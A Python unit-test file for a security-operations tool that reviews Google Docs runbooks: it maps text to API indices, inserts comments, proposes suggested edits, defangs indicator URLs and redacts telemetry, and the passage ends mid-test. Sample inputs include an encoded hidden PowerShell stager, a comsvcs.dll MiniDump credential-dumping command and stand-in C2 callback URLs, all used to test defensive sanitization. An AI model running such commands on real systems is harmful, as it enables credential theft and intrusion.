"""Unit tests for ``manager.tools.docs_review_tools``: Google Docs API v1
non-destructive review primitives (UTF-16 index mapping, dual-identity token
resolution, ``insert_doc_comments``, and back-to-front descending-index
``propose_doc_suggested_edits`` with ``writeMode="SUGGEST"``)."""

from __future__ import annotations

import json
import os
from types import SimpleNamespace
from typing import Any
from unittest.mock import patch

import httpx
import pytest

from manager.tools.docs_review_tools import (
     clear_doc_index_cache,
    _extract_text_and_index_map,
    _find_quote_indices,
    create_google_doc,
    insert_doc_comments,
    propose_doc_suggested_edits,
    read_google_doc,
    resolve_docs_token,
)
from skills.drive_registry import DriveMcpClient, StaticTokenSource
from tests.fake_drive_mcp import GOOGLE_DOC_MIME_TYPE, FakeDriveMcpServer


def make_fake_doc_payload() -> dict[str, Any]:
    """Builds a realistic Google Docs API v1 ``documents.get`` response with
    both body paragraphs and a table cell."""
    # Paragraph 1 (startIndex 1): "Use roles/owner for Vertex AI.\n" (31 chars -> indices 1..31)
    # Table cell paragraph (startIndex 35): "gemini-1.5-pro is current.\n" (27 chars -> indices 35..61)
    # Paragraph 2 (startIndex 65): "Run gcloud alpha chronicle list.\n" (33 chars -> indices 65..97)
    p1_text = "Use roles/owner for Vertex AI.\n"
    cell_text = "gemini-1.5-pro is current.\n"
    p2_text = "Run gcloud alpha chronicle list.\n"
    return {
        "documentId": "doc-123",
        "title": "SOC Runbook Draft",
        "tabs": [
            {
                "documentTab": {
                    "body": {
                        "content": [
                            {
                                "paragraph": {
                                    "elements": [
                                        {
                                            "startIndex": 1,
                                            "endIndex": 1 + len(p1_text),
                                            "textRun": {"content": p1_text},
                                        }
                                    ]
                                }
                            },
                            {
                                "table": {
                                    "tableRows": [
                                        {
                                            "tableCells": [
                                                {
                                                    "content": [
                                                        {
                                                            "paragraph": {
                                                                "elements": [
                                                                    {
                                                                        "startIndex": 35,
                                                                        "endIndex": 35 + len(cell_text),
                                                                        "textRun": {"content": cell_text},
                                                                    }
                                                                ]
                                                            }
                                                        }
                                                    ]
                                                }
                                            ]
                                        }
                                    ]
                                }
                            },
                            {
                                "paragraph": {
                                    "elements": [
                                        {
                                            "startIndex": 65,
                                            "endIndex": 65 + len(p2_text),
                                            "textRun": {"content": p2_text},
                                        }
                                    ]
                                }
                            },
                        ]
                    }
                }
            }
        ],
    }


@pytest.fixture(autouse=True)
def _reset_doc_cache():
    clear_doc_index_cache()
    yield
    clear_doc_index_cache()


# ---------------------------------------------------------------------------
# 1. UTF-16 Index Extraction & Quote Resolution
# ---------------------------------------------------------------------------


def test_extract_text_and_index_map_handles_paragraphs_and_tables():
    doc = make_fake_doc_payload()
    plain_text, index_map = _extract_text_and_index_map(doc)

    assert "Use roles/owner for Vertex AI." in plain_text
    assert "gemini-1.5-pro is current." in plain_text
    assert "Run gcloud alpha chronicle list." in plain_text
    assert len(plain_text) == len(index_map)

    # First quote inside Paragraph 1 (starts at index 1 + 4 = 5)
    span1 = _find_quote_indices(plain_text, index_map, "roles/owner")
    assert span1 == (5, 16)

    # Second quote inside the Table Cell (starts at index 35)
    span2 = _find_quote_indices(plain_text, index_map, "gemini-1.5-pro")
    assert span2 == (35, 49)

    # Third quote inside Paragraph 2 (starts at index 65 + 4 = 69)
    span3 = _find_quote_indices(plain_text, index_map, "gcloud alpha chronicle list")
    assert span3 == (69, 96)


def test_extract_text_and_index_map_handles_utf16_surrogate_pairs():
    """Characters outside the Basic Multilingual Plane occupy 2 UTF-16 code units
    in the Google Docs API index space."""
    # U+1D400 (MATHEMATICAL BOLD CAPITAL A) is 4 bytes in UTF-8, 2 code units in UTF-16.
    text = "A\U0001d400B\n"
    doc = {
        "body": {
            "content": [
                {
                    "paragraph": {
                        "elements": [
                            {
                                "startIndex": 1,
                                "endIndex": 6,
                                "textRun": {"content": text},
                            }
                        ]
                    }
                }
            ]
        }
    }
    plain_text, index_map = _extract_text_and_index_map(doc)
    assert plain_text == text
    # 'A' -> 1, U+1D400 -> 2 (takes 2 UTF-16 units: 2 and 3), 'B' -> 4, '\n' -> 5
    assert index_map == [1, 2, 4, 5]
    assert _find_quote_indices(plain_text, index_map, "B") == (4, 5)


# ---------------------------------------------------------------------------
# 2. Dual-Identity Token Resolution
# ---------------------------------------------------------------------------


def test_resolve_docs_token_prefers_session_user_access_token_over_adc():
    ctx = SimpleNamespace(state={"user_access_token": "oauth-user-token-777"})
    token = resolve_docs_token(
        tool_context=ctx,
        token_source=StaticTokenSource("adc-fallback-token"),
    )
    assert token == "oauth-user-token-777"


def test_resolve_docs_token_falls_back_to_adc_when_no_user_token():
    ctx = SimpleNamespace(state={})
    token = resolve_docs_token(
        tool_context=ctx,
        token_source=StaticTokenSource("adc-fallback-token"),
    )
    assert token == "adc-fallback-token"


# ---------------------------------------------------------------------------
# 3. End-to-End Flow: read_google_doc -> insert_doc_comments -> propose_doc_suggested_edits
# ---------------------------------------------------------------------------


def test_read_insert_comments_and_propose_suggested_edits_ordering_and_payload():
    doc_payload = make_fake_doc_payload()
    recorded_requests: list[tuple[str, str, dict[str, Any], dict[str, str]]] = []

    def handler(request: httpx.Request) -> httpx.Response:
        headers = {k.lower(): v for k, v in request.headers.items()}
        if request.method == "GET":
            recorded_requests.append((request.method, str(request.url), {}, headers))
            return httpx.Response(200, json=doc_payload)
        body = json.loads(request.content.decode("utf-8"))
        recorded_requests.append((request.method, str(request.url), body, headers))
        if "insertComment" in json.dumps(body):
            return httpx.Response(
                200,
                json={
                    "replies": [
                        {"insertComment": {"commentId": f"c-{i}"}}
                        for i in range(len(body.get("requests", [])))
                    ]
                },
            )
        return httpx.Response(200, json={"replies": [{} for _ in body.get("requests", [])]})

    transport = httpx.MockTransport(handler)
    ctx = SimpleNamespace(state={"user_access_token": "user-oauth-tok"})

    # Step 1: read_google_doc populates doc_plain_text and doc_index_map
    read_res = read_google_doc(
        "doc-123",
        tool_context=ctx,
        quota_project="dandye-0324-chronicle",
        transport=transport,
    )
    assert read_res["status"] == "success"
    assert read_res["title"] == "SOC Runbook Draft"
    assert "roles/owner" in read_res["content"]
    assert "doc_plain_text" in ctx.state
    assert "doc_index_map" in ctx.state

    # Step 2: insert_doc_comments anchors native comments BEFORE any text edits
    comments_input = json.dumps(
        [
            {
                "quote": "roles/owner",
                "comment": "Grant least-privilege roles/aiplatform.user instead of roles/owner (https://docs.cloud.google.com/iam/docs/understanding-roles).",
            },
            {
                "quote": "gcloud alpha chronicle list",
                "comment": "Verify exact Chronicle CLI flags via Developer Knowledge MCP.",
            },
        ]
    )
    comment_res = insert_doc_comments(
        "doc-123",
        comments_input,
        tool_context=ctx,
        quota_project="dandye-0324-chronicle",
        transport=transport,
    )
    assert comment_res["status"] == "success"
    assert comment_res["inserted_count"] == 2
    assert comment_res["comment_ids"] == ["c-0", "c-1"]

    _, comment_url, comment_body, comment_headers = recorded_requests[1]
    assert comment_url == "https://docs.googleapis.com/v1/documents/doc-123:batchUpdate"
    assert comment_headers["authorization"] == "Bearer user-oauth-tok"
    assert comment_headers["x-goog-user-project"] == "dandye-0324-chronicle"
    assert comment_body["requests"] == [
        {
            "insertComment": {
                "content": "Grant least-privilege roles/aiplatform.user instead of roles/owner (https://docs.cloud.google.com/iam/docs/understanding-roles).",
                "range": {"startIndex": 5, "endIndex": 16},
            }
        },
        {
            "insertComment": {
                "content": "Verify exact Chronicle CLI flags via Developer Knowledge MCP.",
                "range": {"startIndex": 69, "endIndex": 96},
            }
        },
    ]

    # Step 3: propose_doc_suggested_edits sorts ranges DESCENDING by startIndex
    # and attaches writeControl: {"writeMode": "SUGGEST"}
    edits_input = json.dumps(
        [
            # Deliberately supply in ascending document order (startIndex 5, then 35, then 69)
            {"quote": "roles/owner", "replacement": "roles/aiplatform.user"},
            {"quote": "gemini-1.5-pro", "replacement": "gemini-2.5-pro"},
            {"quote": "gcloud alpha chronicle list", "replacement": "gcloud chronicle instances describe"},
        ]
    )
    edit_res = propose_doc_suggested_edits(
        "doc-123",
        edits_input,
        tool_context=ctx,
        quota_project="dandye-0324-chronicle",
        transport=transport,
    )
    assert edit_res["status"] == "success"
    assert edit_res["applied_count"] == 3

    _, edit_url, edit_body, _ = recorded_requests[2]
    assert edit_url == "https://docs.googleapis.com/v1/documents/doc-123:batchUpdate"
    assert edit_body["writeControl"] == {"writeMode": "SUGGEST"}

    # Verify requests are ordered back-to-front: startIndex 69 first, then 35, then 5!
    reqs = edit_body["requests"]
    assert len(reqs) == 6
    assert reqs[0] == {"deleteContentRange": {"range": {"startIndex": 69, "endIndex": 96}}}
    assert reqs[1] == {
        "insertText": {"location": {"index": 69}, "text": "gcloud chronicle instances describe"}
    }
    assert reqs[2] == {"deleteContentRange": {"range": {"startIndex": 35, "endIndex": 49}}}
    assert reqs[3] == {"insertText": {"location": {"index": 35}, "text": "gemini-2.5-pro"}}
    assert reqs[4] == {"deleteContentRange": {"range": {"startIndex": 5, "endIndex": 16}}}
    assert reqs[5] == {"insertText": {"location": {"index": 5}, "text": "roles/aiplatform.user"}}


def test_propose_doc_suggested_edits_rejects_overlapping_ranges():
    doc_payload = make_fake_doc_payload()
    transport = httpx.MockTransport(lambda req: httpx.Response(200, json=doc_payload))
    ctx = SimpleNamespace(state={"user_access_token": "tok"})

    read_google_doc("doc-123", tool_context=ctx, transport=transport)

    # "Use roles/owner" (1..16) overlaps with "roles/owner for Vertex AI" (5..30)
    overlapping_edits = json.dumps(
        [
            {"quote": "Use roles/owner", "replacement": "Grant roles/aiplatform.user"},
            {"quote": "roles/owner for Vertex AI", "replacement": "roles/aiplatform.user for Vertex"},
        ]
    )
    res = propose_doc_suggested_edits(
        "doc-123", overlapping_edits, tool_context=ctx, transport=transport
    )
    assert res["status"] == "error"
    assert "Overlapping edit ranges" in res["message"]


def test_works_without_tool_context_via_in_process_doc_cache():
    """Direct Python callers or ADK wrappers that do not pass ``tool_context``
    still share the index map harvested by ``read_google_doc``."""
    doc_payload = make_fake_doc_payload()

    def handler(request: httpx.Request) -> httpx.Response:
        if request.method == "GET":
            return httpx.Response(200, json=doc_payload)
        return httpx.Response(200, json={"replies": [{"insertComment": {"commentId": "c-standalone"}}]})

    transport = httpx.MockTransport(handler)
    token_source = StaticTokenSource("standalone-adc-token")

    read_res = read_google_doc(
        "doc-123", tool_context=None, token_source=token_source, transport=transport
    )
    assert read_res["status"] == "success"

    comment_res = insert_doc_comments(
        "doc-123",
        [{"quote": "roles/owner", "comment": "Use least privilege."}],
        tool_context=None,
        token_source=token_source,
        transport=transport,
    )
    assert comment_res["status"] == "success"
    assert comment_res["inserted_count"] == 1


def test_create_google_doc_creates_converted_google_doc_in_drive(
    fake_drive: FakeDriveMcpServer,
):
    reports_folder = fake_drive.store.add_folder("SOC Reports")
    client = DriveMcpClient(
        url=fake_drive.url,
        token_source=StaticTokenSource("drive-tok"),
        quota_project="dandye-0324-chronicle",
    )
    with patch.dict(os.environ, {"DRIVE_REPORTS_FOLDER_ID": reports_folder}, clear=False):
        created = create_google_doc(
            title="Suspicious Login Runbook Review",
            content="# Suspicious Login Triage\n\nUse roles/owner for Vertex AI.\n",
            client=client,
        )
    assert created["status"] == "success"
    assert created["mimeType"] == GOOGLE_DOC_MIME_TYPE
    assert created["parentId"] == reports_folder
    # Verify disableConversionToGoogleType was False so Drive converted text -> Google Doc
    create_calls = fake_drive.store.calls_for("create_file")
    assert len(create_calls) == 1
    assert create_calls[0]["disableConversionToGoogleType"] is False


def test_adk_function_tool_declarations_for_docs_review_tools():
    """Verifies that the LLM-facing wrapper functions in ``manager.tools.tools``
    generate valid ADK ``FunctionDeclaration`` schemas without leaking internal
    test-only parameters (``transport``, ``token_source``, ``client``) or
    ``tool_context``."""
    from google.adk.tools.function_tool import FunctionTool
    from manager.tools import tools as tools_module

    for fn_name in (
        "create_google_doc",
        "read_google_doc",
        "insert_doc_comments",
        "propose_doc_suggested_edits",
        "review_google_doc_with_stage_a",
        "stage_runbook_update_as_google_doc",
        "post_reviewed_doc_to_soar_case",
        "verify_and_redline_udm_queries_in_doc",
        "verify_and_redline_yaral2_rules_in_doc",
        "verify_and_redline_mitre_and_cve_in_doc",
        "sanitize_and_redline_telemetry_in_doc",
        "inspect_doc_suggestions",
        "export_accepted_doc_to_markdown",
    ):
        fn = getattr(tools_module, fn_name)
        ft = FunctionTool(fn)
        decl = ft._get_declaration()
        assert decl is not None
        assert decl.name == fn_name
        schema = decl.parameters_json_schema or {}
        props = schema.get("properties", {})
        assert "tool_context" not in props
        assert "transport" not in props
        assert "token_source" not in props
        assert "client" not in props
        assert "siem_search_fn" not in props
        assert "siem_validate_fn" not in props
        assert "web_verifier_fn" not in props
        assert "skill_content_override" not in props


def test_sanitize_telemetry_text_redacts_encoded_blobs_and_memdump_args():
    from manager.tools.docs_review_tools import sanitize_telemetry_text

    raw_cmd = "powershell.exe -NoP -W Hidden -Enc aGVsbG8gd29ybGQgdGVzdCBwYXlsb2Fk"
    sanitized = sanitize_telemetry_text(raw_cmd)
    assert "aGVsbG8gd29ybGQgdGVzdCBwYXlsb2Fk" not in sanitized
    assert "<REDACTED_B64:len=32,sha256=" in sanitized

    raw_dump = "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\temp\\out.dmp full"
    sanitized_dump = sanitize_telemetry_text(raw_dump)
    assert "624 C:\\temp\\out.dmp" not in sanitized_dump
    assert "MiniDump <REDACTED_DUMP_ARGS:sha256=" in sanitized_dump

    sha256_hex = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
    with_hash = f"file_sha256={sha256_hex}"
    assert sanitize_telemetry_text(with_hash) == with_hash


def test_find_deterministic_indicator_spans_and_span_based_edits():
    from manager.tools.docs_review_tools import (
        _extract_text_and_index_map,
        defang_url,
        find_deterministic_indicator_spans,
    )

    assert defang_url("https://c2.badactor-example.com/auth") == "hxxps://c2[.]badactor-example[.]com/auth"

    p1 = "Callback to https://c2.badactor-example.com/auth observed.\n"
    p2 = "Reference: https://docs.cloud.google.com/iam/docs/service-accounts-disable-enable\n"
    doc = {
        "documentId": "doc-123",
        "title": "Indicator Review Test",
        "body": {
            "content": [
                {
                    "paragraph": {
                        "elements": [
                            {
                                "startIndex": 1,
                                "endIndex": 1 + len(p1),
                                "textRun": {"content": p1},
                            }
                        ]
                    }
                },
                {
                    "paragraph": {
                        "elements": [
                            {
                                "startIndex": 1 + len(p1),
                                "endIndex": 1 + len(p1) + len(p2),
                                "textRun": {"content": p2},
                            }
                        ]
                    }
                },
            ]
        },
    }
    plain_text, index_map = _extract_text_and_index_map(doc)
    comments, edits = find_deterministic_indicator_spans(plain_text, index_map)
    assert len(comments) == 1
    assert len(edits) == 1
    assert edits[0]["replacement"] == "hxxps://c2[.]badactor-example[.]com/auth"
    assert isinstance(edits[0]["start_index"], int)
    assert isinstance(edits[0]["end_index"], int)

    batch_calls: list[dict[str, Any]] = []

    def handler(request: httpx.Request) -> httpx.Response:
        if request.method == "GET":
            return httpx.Response(200, json=doc)
        body = json.loads(request.content.decode("utf-8"))
        batch_calls.append(body)
        if "insertComment" in json.dumps(body):
            return httpx.Response(
                200,
                json={"replies": [{"insertComment": {"commentId": "c-span-0"}}]},
            )
        return httpx.Response(200, json={"replies": [{} for _ in body.get("requests", [])]})

    transport = httpx.MockTransport(handler)
    token_source = StaticTokenSource("adc-token")
    ctx = SimpleNamespace(state={})
    read_google_doc("doc-123", tool_context=ctx, token_source=token_source, transport=transport)

    comment_res = insert_doc_comments(
        "doc-123",
        comments,
        tool_context=ctx,
        token_source=token_source,
        transport=transport,
    )
    assert comment_res["status"] == "success"
    assert comment_res["inserted_count"] == 1

    edit_res = propose_doc_suggested_edits(
        "doc-123",
        edits,
        tool_context=ctx,
        token_source=token_source,
        transport=transport,
    )
    assert edit_res["status"] == "success"
    assert edit_res["applied_count"] == 1
    assert batch_calls[1]["writeControl"] == {"writeMode": "SUGGEST"}


def test_review_google_doc_with_stage_a_combines_span_and_semantic_reviews():
    from manager.tools.docs_review_tools import review_google_doc_with_stage_a

    p1 = "Callback to https://c2.badactor-example.com/stage2.ps1 observed.\n"
    p2 = "Containment: gcloud iam service-accounts delete compromised-sa@proj.iam.gserviceaccount.com\n"
    doc = {
        "documentId": "doc-stage-ab",
        "title": "Combined Review Test",
        "body": {
            "content": [
                {
                    "paragraph": {
                        "elements": [
                            {
                                "startIndex": 1,
                                "endIndex": 1 + len(p1),
                                "textRun": {"content": p1},
                            }
                        ]
                    }
                },
                {
                    "paragraph": {
                        "elements": [
                            {
                                "startIndex": 1 + len(p1),
                                "endIndex": 1 + len(p1) + len(p2),
                                "textRun": {"content": p2},
                            }
                        ]
                    }
                },
            ]
        },
    }
    batch_calls: list[dict[str, Any]] = []

    def handler(request: httpx.Request) -> httpx.Response:
        if request.method == "GET":
            return httpx.Response(200, json=doc)
        body = json.loads(request.content.decode("utf-8"))
        batch_calls.append(body)
        if "insertComment" in json.dumps(body):
            return httpx.Response(
                200,
                json={
                    "replies": [
                        {"insertComment": {"commentId": f"c-{i}"}}
                        for i in range(len(body.get("requests", [])))
                    ]
                },
            )
        return httpx.Response(
            200, json={"replies": [{} for _ in body.get("requests", [])]}
        )

    transport = httpx.MockTransport(handler)
    token_source = StaticTokenSource("adc-token")

    res = review_google_doc_with_stage_a(
        "doc-stage-ab",
        semantic_comments=[
            {
                "quote": "gcloud iam service-accounts delete",
                "comment": "Use reversible disable instead of delete (https://docs.cloud.google.com/iam/docs/service-accounts-disable-enable).",
            }
        ],
        semantic_edits=[
            {
                "quote": "gcloud iam service-accounts delete",
                "replacement": "gcloud iam service-accounts disable",
            }
        ],
        token_source=token_source,
        transport=transport,
    )
    assert res["status"] == "success"
    assert res["stage_a_url_count"] == 1
    assert res["comments"]["inserted_count"] == 2
    assert res["edits"]["applied_count"] == 2
    assert len(batch_calls) == 2
    assert "insertComment" in batch_calls[0]["requests"][0]
    assert batch_calls[1]["writeControl"] == {"writeMode": "SUGGEST"}
    # Verify back-to-front ordering: paragraph 2 edit (higher startIndex) comes before paragraph 1 URL edit
    first_del_start = batch_calls[1]["requests"][0]["deleteContentRange"]["range"]["startIndex"]
    second_del_start = batch_calls[1]["requests"][2]["deleteContentRange"]["range"]["startIndex"]
    assert first_del_start > second_del_start


def test_stage_runbook_update_as_google_doc_creates_and_redlines_runbook_draft(
    fake_drive: FakeDriveMcpServer,
):
    from manager.tools.docs_review_tools import stage_runbook_update_as_google_doc

    reports_folder = fake_drive.store.add_folder("SOC Reports")
    client = DriveMcpClient(
        url=fake_drive.url,
        token_source=StaticTokenSource("drive-tok"),
        quota_project="dandye-0324-chronicle",
    )

    runbook_md = (
        "# Compromised User Account Response\n\n"
        "## Containment\n"
        "- Execute `gcloud iam service-accounts delete` on affected service accounts.\n"
    )
    appended_lessons = (
        "## Lessons Learned from SOAR Case 33278\n"
        "- Attacker callback URL: https://c2.badactor-example.com/beacon\n"
        "- Query UDM field: `resource.name = \"projects/base-analytics/instances/prod-customers\"`\n"
    )
    combined_text = runbook_md.rstrip() + "\n\n" + appended_lessons.strip() + "\n"
    doc_payload = {
        "documentId": "doc-runbook-1",
        "title": "Runbook_Redline_compromised-user-account-response_Case_33278",
        "body": {
            "content": [
                {
                    "paragraph": {
                        "elements": [
                            {
                                "startIndex": 1,
                                "endIndex": 1 + len(combined_text),
                                "textRun": {"content": combined_text},
                            }
                        ]
                    }
                }
            ]
        },
    }

    def handler(request: httpx.Request) -> httpx.Response:
        if request.method == "GET":
            return httpx.Response(200, json=doc_payload)
        body = json.loads(request.content.decode("utf-8"))
        if "insertComment" in json.dumps(body):
            return httpx.Response(
                200,
                json={
                    "replies": [
                        {"insertComment": {"commentId": f"c-rb-{i}"}}
                        for i in range(len(body.get("requests", [])))
                    ]
                },
            )
        return httpx.Response(
            200, json={"replies": [{} for _ in body.get("requests", [])]}
        )

    transport = httpx.MockTransport(handler)
    token_source = StaticTokenSource("adc-token")

    with patch.dict(os.environ, {"DRIVE_REPORTS_FOLDER_ID": reports_folder}, clear=False):
        res = stage_runbook_update_as_google_doc(
            skill_name="compromised-user-account-response",
            case_id="33278",
            semantic_comments=[
                {
                    "quote": "gcloud iam service-accounts delete",
                    "comment": "Case 33278 Lesson Learned: Use reversible disable instead of delete (https://docs.cloud.google.com/iam/docs/service-accounts-disable-enable).",
                },
                {
                    "quote": "resource.name",
                    "comment": "Case 33278 Lesson Learned: Prefix UDM field with target.resource.name (https://docs.cloud.google.com/chronicle/docs/reference/udm-field-list).",
                },
            ],
            semantic_edits=[
                {
                    "quote": "gcloud iam service-accounts delete",
                    "replacement": "gcloud iam service-accounts disable",
                },
                {
                    "quote": "resource.name",
                    "replacement": "target.resource.name",
                },
            ],
            lessons_learned_markdown=appended_lessons,
            skill_content_override=runbook_md,
            client=client,
            token_source=token_source,
            transport=transport,
        )

    assert res["status"] == "success"
    assert res["skill_name"] == "compromised-user-account-response"
    assert res["case_id"] == "33278"
    assert res["stage_a_url_count"] == 1
    assert res["comments"]["inserted_count"] == 3
    assert res["edits"]["applied_count"] == 3


def test_post_reviewed_doc_to_soar_case_sanitizes_and_posts_comment():
    from manager.tools.docs_review_tools import post_reviewed_doc_to_soar_case

    recorded_soar_calls: list[tuple[str, str]] = []

    def fake_soar_post(case_id: str, comment: str) -> dict[str, Any]:
        recorded_soar_calls.append((case_id, comment))
        return {"id": 99901, "comment": comment, "case_id": case_id}

    res = post_reviewed_doc_to_soar_case(
        case_id="33288",
        doc_title="SOAR_Case_33288_Sanitized_3Stage_Intrusion_Review",
        doc_url="https://docs.google.com/document/d/doc-33288/edit",
        skill_name="phishing-response",
        redline_summary=[
            "Defanged live phishing URL via Stage A span-based addressing",
            "Corrected LSASS MiniDump 624 C:\\temp\\lsass.dmp full technique to T1003.001",
            "Sanitized stager -Enc aGVsbG8gd29ybGQgdGVzdCBwYXlsb2Fk",
        ],
        runbook_doc_url="https://docs.google.com/document/d/rb-33288/edit",
        soar_comment_fn=fake_soar_post,
    )
    assert res["status"] == "success"
    assert len(recorded_soar_calls) == 1
    posted_case_id, posted_comment = recorded_soar_calls[0]
    assert posted_case_id == "33288"
    assert "https://docs.google.com/document/d/doc-33288/edit" in posted_comment
    assert "https://docs.google.com/document/d/rb-33288/edit" in posted_comment
    # Verify raw base64 and raw MiniDump args were sanitized before hitting SOAR
    assert "aGVsbG8gd29ybGQgdGVzdCBwYXlsb2Fk" not in posted_comment
    assert "<REDACTED_B64:len=32,sha256=" in posted_comment
    assert "<REDACTED_DUMP_ARGS:sha256=" in posted_comment


def test_grounded_soar_review_workflow_executes_end_to_end():
    from manager.tools.workflow_tools import run_grounded_soar_review_workflow

    out = run_grounded_soar_review_workflow(
        case_id="33278",
        skill_name="compromised-user-account-response",
        raw_telemetry_summary="powershell.exe -NoP -Enc aGVsbG8gd29ybGQgdGVzdCBwYXlsb2Fk",
    )
    assert "33278" in out
    assert "compromised-user-account-response" in out
    assert "aGVsbG8gd29ybGQgdGVzdCBwYXlsb2Fk" not in out
    assert "<REDACTED_B64:len=32,sha256=" in out


# ---------------------------------------------------------------------------
# Cycle 1 (H1): Live Chronicle UDM Query Syntax & Schema Verifier Inside Docs
# ---------------------------------------------------------------------------


def test_find_udm_field_spans_detects_unprefixed_and_hallucinated_udm_fields():
    from manager.tools.docs_review_tools import (
        _extract_text_and_index_map,
        _find_quote_indices,
        find_udm_field_spans,
    )

    p1 = (
        'Valid query: `metadata.event_type = "PROCESS_LAUNCH" AND '
        'target.process.command_line = "powershell.exe" AND principal.ip = "10.0.0.1"`\n'
    )
    p2 = (
        'Broken query 1: `metadata.event_type = "PROCESS_LAUNCH" AND '
        'process.command_line = /.*-enc.*/ nocase AND principal.process.cmd_line != "cmd.exe"`\n'
    )
    p3 = (
        'Broken query 2: `metadata.log_type = "GCP_CLOUDAUDIT" AND '
        'resource.name = "projects/base-production" AND ip = "104.198.226.161"`\n'
    )
    doc = {
        "documentId": "doc-udm-spans",
        "title": "UDM Span Test",
        "body": {
            "content": [
                {
                    "paragraph": {
                        "elements": [
                            {
                                "startIndex": 1,
                                "endIndex": 1 + len(p1),
                                "textRun": {"content": p1},
                            }
                        ]
                    }
                },
                {
                    "paragraph": {
                        "elements": [
                            {
                                "startIndex": 1 + len(p1),
                                "endIndex": 1 + len(p1) + len(p2),
                                "textRun": {"content": p2},
                            }
                        ]
                    }
                },
                {
                    "paragraph": {
                        "elements": [
                            {
                                "startIndex": 1 + len(p1) + len(p2),
                                "endIndex": 1 + len(p1) + len(p2) + len(p3),
                                "textRun": {"content": p3},
                            }
                        ]
                    }
                },
            ]
        },
    }
    plain_text, index_map = _extract_text_and_index_map(doc)
    comments, edits, findings = find_udm_field_spans(plain_text, index_map)

    assert len(findings) == 4
    assert len(comments) == 4
    assert len(edits) == 4

    by_invalid = {f["invalid_field"]: f for f in findings}
    assert set(by_invalid.keys()) == {
        "process.command_line",
        "principal.process.cmd_line",
        "resource.name",
        "ip",
    }
    assert by_invalid["process.command_line"]["canonical_field"] == "target.process.command_line"
    assert (
        by_invalid["principal.process.cmd_line"]["canonical_field"]
        == "principal.process.command_line"
    )
    assert by_invalid["resource.name"]["canonical_field"] == "target.resource.name"
    assert by_invalid["ip"]["canonical_field"] == "principal.ip"

    # Verify exact 1-based UTF-16 span coordinates match _find_quote_indices for each defect
    for field_name in ("resource.name", "principal.process.cmd_line"):
        expected_span = _find_quote_indices(plain_text, index_map, field_name)
        assert (
            by_invalid[field_name]["start_index"],
            by_invalid[field_name]["end_index"],
        ) == expected_span


def test_verify_udm_query_with_siem_repairs_and_executes_dry_run():
    from manager.tools.docs_review_tools import verify_udm_query_with_siem

    captured_calls: list[dict[str, Any]] = []

    def fake_siem_search(
        query: str,
        start_time: str = "",
        end_time: str = "",
        max_events: int = 5,
    ) -> dict[str, Any]:
        captured_calls.append(
            {
                "query": query,
                "start_time": start_time,
                "end_time": end_time,
                "max_events": max_events,
            }
        )
        return {
            "events": [
                {"udm": {"metadata": {"eventType": "USER_RESOURCE_ACCESS"}}},
                {"udm": {"metadata": {"eventType": "USER_RESOURCE_UPDATE_CONTENT"}}},
            ]
        }

    broken_query = (
        'metadata.log_type = "GCP_CLOUDAUDIT" AND '
        'resource.name = "projects/base-production" AND ip = "104.198.226.161"'
    )
    res = verify_udm_query_with_siem(
        broken_query,
        start_time="2026-02-07T19:00:00Z",
        end_time="2026-02-07T19:35:00Z",
        max_events=10,
        siem_search_fn=fake_siem_search,
    )

    assert res["status"] == "success"
    assert res["siem_verified"] is True
    assert res["event_count"] == 2
    assert (
        res["repaired_query"]
        == 'metadata.log_type = "GCP_CLOUDAUDIT" AND '
        'target.resource.name = "projects/base-production" AND principal.ip = "104.198.226.161"'
    )
    assert len(res["replacements"]) == 2
    assert len(captured_calls) == 1
    assert captured_calls[0]["query"] == res["repaired_query"]
    assert captured_calls[0]["max_events"] == 10


def test_verify_and_redline_udm_queries_in_doc_anchors_comments_and_suggest_edits():
    from manager.tools.docs_review_tools import verify_and_redline_udm_queries_in_doc

    p1 = (
        "## Hunting Query\n"
        '`metadata.log_type = "GCP_CLOUDAUDIT" AND resource.name = "projects/base-production" '
        'AND ip = "104.198.226.161"`\n'
    )
    doc = {
        "documentId": "doc-udm-live",
        "title": "UDM Verifier Redline Test",
        "body": {
            "content": [
                {
                    "paragraph": {
                        "elements": [
                            {
                                "startIndex": 1,
                                "endIndex": 1 + len(p1),
                                "textRun": {"content": p1},
                            }
                        ]
                    }
                }
            ]
        },
    }
    batch_calls: list[dict[str, Any]] = []

    def handler(request: httpx.Request) -> httpx.Response:
        if request.method == "GET":
            return httpx.Response(200, json=doc)
        body = json.loads(request.content.decode("utf-8"))
        batch_calls.append(body)
        if "insertComment" in json.dumps(body):
            return httpx.Response(
                200,
                json={
                    "replies": [
                        {"insertComment": {"commentId": f"c-udm-{i}"}}
                        for i in range(len(body.get("requests", [])))
                    ]
                },
            )
        return httpx.Response(
            200, json={"replies": [{} for _ in body.get("requests", [])]}
        )

    def fake_siem_search(query: str, **_kwargs: Any) -> dict[str, Any]:
        return {"events": [{"id": f"ev-{i}"} for i in range(5)]}

    transport = httpx.MockTransport(handler)
    token_source = StaticTokenSource("adc-token")

    res = verify_and_redline_udm_queries_in_doc(
        "doc-udm-live",
        run_live_siem_check=True,
        siem_search_fn=fake_siem_search,
        token_source=token_source,
        transport=transport,
    )

    assert res["status"] == "success"
    assert res["udm_findings_count"] == 2
    assert len(res["siem_checks"]) == 1
    assert res["siem_checks"][0]["siem_verified"] is True
    assert res["siem_checks"][0]["event_count"] == 5
    assert res["comments"]["inserted_count"] == 2
    assert res["edits"]["applied_count"] == 2

    # Verify ordering: insertComment batchUpdate first, writeMode="SUGGEST" batchUpdate second
    assert len(batch_calls) == 2
    comment_reqs = batch_calls[0]["requests"]
    assert len(comment_reqs) == 2
    assert "udm-field-list" in comment_reqs[0]["insertComment"]["content"]
    assert "events_matched=5" in comment_reqs[0]["insertComment"]["content"]

    edit_batch = batch_calls[1]
    assert edit_batch["writeControl"] == {"writeMode": "SUGGEST"}
    # Descending startIndex order: 'ip' (later in line) deleted/inserted before 'resource.name' (earlier)
    first_del = edit_batch["requests"][0]["deleteContentRange"]["range"]["startIndex"]
    second_del = edit_batch["requests"][2]["deleteContentRange"]["range"]["startIndex"]
    assert first_del > second_del


def test_review_google_doc_with_stage_a_deduplicates_udm_and_semantic_spans():
    from manager.tools.docs_review_tools import review_google_doc_with_stage_a

    p1 = (
        'Run query: `metadata.event_type = "PROCESS_LAUNCH" AND '
        'process.command_line = /.*-enc.*/ AND file.sha256 = "abcd"`\n'
    )
    doc = {
        "documentId": "doc-dedup-udm",
        "title": "Dedup UDM Stage A/B Test",
        "body": {
            "content": [
                {
                    "paragraph": {
                        "elements": [
                            {
